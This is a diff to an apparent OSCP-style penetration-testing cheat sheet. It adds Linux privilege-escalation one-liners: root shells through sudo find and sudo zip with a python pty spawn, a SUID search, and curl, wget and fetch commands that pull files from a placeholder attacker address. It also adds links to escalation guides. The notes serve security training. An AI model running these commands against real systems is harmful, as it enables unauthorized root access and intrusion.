@@ -80,16 +80,23 @@
           - ```stty -rows 48 -columns 120``` (eg size)
 - Priv esc linux
   - try ```sudo su``` or ```sudo -l```
+   - If ```find``` has sudo ```sudo find /home -exec sh -i \; ```
+   - ```sudo zip exploit.zip exploit -T --unzip-command="python -c 'import pty; pty.spawn(\"/bin/sh\")'"``` (https://v3ded.github.io/ctf/zico2.html)
   - if these don’t work try get kernel and distro info to look for exploits
   - ```uname -ar```
   - ```cat /etc/issue```
   - ```cat /etc/*-release```
   - ```cat /etc/lsb-release```
   - ```cat /etc/redhat-release```
+  - SUID
+    - ```find / -perm -u=s -type f 2>/dev/null ```
   - Available programs/languages on host:
     - Perl,python etc
     - Nc,ncat,wget,curl
-    - ```$fetch -o theFile http://IP:PORT/theFile``` (FreeBSD)
+    - ```curl -o theFile http://IP:PORT/theFile```
+    - ```curl ftp://ftp.domain.com --user username:password``` Access FTP server (Add file to end of domain to download)
+    - ```wget http://IP:PORT/theFile -O theFile```
+    - ```fetch -o theFile http://IP:PORT/theFile``` (FreeBSD)
   - Password Files
     - /etc/pwd.db 
     - /etc/spwd.db
@@ -144,5 +151,6 @@
 - https://medium.com/@hakluke/haklukes-ultimate-oscp-guide-part-3-practical-hacking-tips-and-tricks-c38486f5fc97
 - https://sushant747.gitbooks.io/total-oscp-guide/connections.html
 - http://www.fuzzysecurity.com/tutorials/16.html - Windows Priveledge Escalation tips
+- https://payatu.com/guide-linux-privilege-escalation/ - Linux Privesc
 
 
